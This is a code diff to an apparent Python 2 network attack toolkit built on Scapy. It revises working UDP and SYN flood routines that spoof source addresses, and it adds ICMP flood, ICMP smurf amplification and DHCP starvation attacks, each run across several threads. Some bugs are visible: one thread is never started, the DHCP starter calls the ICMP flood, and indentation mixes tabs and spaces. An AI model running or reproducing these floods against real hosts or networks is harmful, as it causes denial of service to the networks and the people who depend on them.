@@ -63,25 +63,21 @@ class Jam(object):
                 except Exception as e:
                         print "[!] Exception caught: {}".format(e)
 
-
-
-
 	def udpfloodstart(self, host, tgt, dport):
 		self.src = host
 		self.tgt = tgt
 		self.dport = dport
 		try:
 			print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
-			for i in range(0,5):
+			for i in range(0,3):
 				u = threading.Thread(name='udpflood',target=self.udpflood)
 				u.setDaemon(True)
 				u.start()
+			self.udpflood()
+		except KeyboardInterrupt:
+			print "[-] UDP flood denial of service finalized."
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
-
-	def udpfloodstop(self):
-		print "[-] UDP flood denial of service finalized."
-		exit(0)
 
 	def udpflood(self):
 		try:
@@ -89,8 +85,8 @@ class Jam(object):
 			UDP_layer = UDP(sport=1337,dport=self.dport)
 			pkt = IP_layer/UDP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
-		except:
-			print "[!] Error: check the parameters (target, port)"
+		except Exception as e:
+			print "[!] Error: {}".format(e)
 
 	def synfloodstart(self, host, tgt, dport):
 		self.src = host
@@ -98,16 +94,15 @@ class Jam(object):
 		self.dport = dport
 		try:
 			print "[+] SYN flood denial of service initialized."
-			for i in range(0,5):
+			for i in range(0,3):
 				s = threading.Thread(name='synflood', target=self.synflood)
 				s.setDaemon(True)
 				s.start()
+			self.synflood()
+		except KeyboardInterrupt:
+			print "[-] SYN flood denial of service finalized."
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
-
-	def synfloodstop(self):
-		print "[-] SYN flood denial of service finalized."
-		exit(0)
 
 	def synflood(self):
 		try:
@@ -115,23 +110,87 @@ class Jam(object):
 			TCP_layer = TCP(sport=1337,dport=self.dport)
 			pkt = IP_layer/TCP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
-		except:
-			print "[!] Error: check the parameters (target, port)"
+		except Exception as e:
+			print "[!] Error: {}".format(e)
 
 
-	def icmpsmurfstart(self, tgt):
+        def icmpfloodstart(self, host, tgt):
+                self.src = host
+                self.tgt = tgt
+                try:
+                        print "[+] ICMP flood denial of service initialized."
+                        for x in range(0,3):
+                                i = threading.Thread(name='icmpflood', target=self.icmpflood)
+                                i.setDaemon(True)
+                                i.start()
+                        self.icmpflood()
+                except KeyboardInterrupt:
+                        print "[-] ICMP flood denial of service finalized."
+                except Exception as e:
+                        print "[!] Exception caught: {}".format(e)
+
+	def icmpflood(self):
 		try:
-			broadcast = raw_input("[+] Address/Network to send echo-requests: ")
-			IP_layer = IP(src=tgt,dst=broadcast)
+			IP_layer = IP(src=self.src, dst=self.tgt)
 			ICMP_layer = ICMP()
 			pkt = IP_layer/ICMP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
+		except Exception as e:
+			print "[!] Error: {}".format(e)
+
+
+	def icmpsmurfstart(self, tgt):
+		self.tgt = tgt
+		try:
+			multicast = raw_input("[+] IP Address(es) to send echo-requests (separated by commas): ")
+			try:
+				self.multicast = multicast.split(",")
+			except:
+				self.multicast
+			print "[+] ICMP smurf denial of service initialized."
+			for x in range(0,3):
+				i2 = threading.Thread(name='icmpsmurf',target=self.icmpsmurf)
+				i2.setDaemon(True)
+				i2.start
+			self.icmpsmurf()
 		except KeyboardInterrupt:
-			print
+			print "[-] ICMP smurf denial of service finalized."
 		except:
 			print "[!] Error: check the parameters (target)"
 
-	def icmpsmurfstop(self):
-		print "[-] ICMP smurf denial of service finalized."
-		exit(0)
 
+	def icmpsmurf(self):
+		try:
+			while True:
+				for ip in self.multicast:
+					IP_layer = IP(src=self.tgt,dst=ip)
+					ICMP_layer = ICMP()
+					pkt = IP_layer/ICMP_layer
+					send(pkt, verbose=False)
+
+		except Exception as e:
+			print "[!] Error: {}".format(e)
+
+
+        def dhcpstarvationstart(self):
+                try:
+                        print "[+] DHCP starvation denial of service initialized."
+                        for x in range(0,3):
+                                i = threading.Thread(name='dhcpstarvation', target=self.dhcpstarvation)
+                                i.setDaemon(True)
+                                i.start()
+                        self.icmpflood()
+                except KeyboardInterrupt:
+                        print "[-] DHCP starvation denial of service finalized."
+                except Exception as e:
+                        print "[!] Exception caught: {}".format(e)
+
+
+
+	def dhcpstarvation(self):
+		try:
+			conf.checkIPaddr = False
+			dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
+			sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
+		except Exception as e:
+			print "[!] Error: {}".format(e)
